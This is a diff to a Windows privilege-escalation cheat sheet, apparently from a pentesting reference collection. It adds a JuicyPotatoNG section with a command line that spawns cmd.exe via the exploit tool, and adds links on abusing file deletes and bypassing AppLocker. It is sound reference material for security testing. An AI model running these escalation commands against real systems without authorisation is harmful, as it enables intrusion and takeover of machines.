@@ -956,9 +956,8 @@ Example: "Windows Help and Support" (Windows + F1), search for "command prompt",
 Look for vuln drivers loaded, we often don't spend enough time looking at this:
 
 ```powershell
-# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
-
-PS C:\Users\Swissky> driverquery.exe /fo table
+# Native binary
+PS C:\Users\Swissky> driverquery.exe /fo table /si
 Module Name  Display Name           Driver Type   Link Date
 ============ ====================== ============= ======================
 1394ohci     1394 OHCI Compliant Ho Kernel        12/10/2006 4:44:38 PM
@@ -972,6 +971,7 @@ acpitime     ACPI Wake Alarm Driver Kernel        2/9/1974 7:10:30 AM
 ADP80XX      ADP80XX                Kernel        4/9/2015 4:49:48 PM
 <SNIP>
 
+# https://github.com/matterpreter/OffensiveCSharp/tree/master/DriverQuery
 PS C:\Users\Swissky> DriverQuery.exe --no-msft
 [+] Enumerating driver services...
 [+] Checking file signatures...
@@ -1289,6 +1289,14 @@ C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
 C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs
 ```
 
+### JuicyPotatoNG
+
+* [antonioCoco/JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
+
+```powershell
+JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypotatong.txt
+```
+
 
 ## EoP - Privileged File Write
 
@@ -1502,5 +1510,8 @@ Detailed information about the vulnerability : https://www.zerodayinitiative.com
 * [Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018](https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html)
 * [Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019](https://itm4n.github.io/usodllloader-part2/)
 * [Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows](https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1)
-* [Abusing SeLoadDriverPrivilege for privilege escalation - 14 - JUN - 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
+* [Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
 * [Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)](https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/)
+* [ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
+* [Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian](https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/)
+* [Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
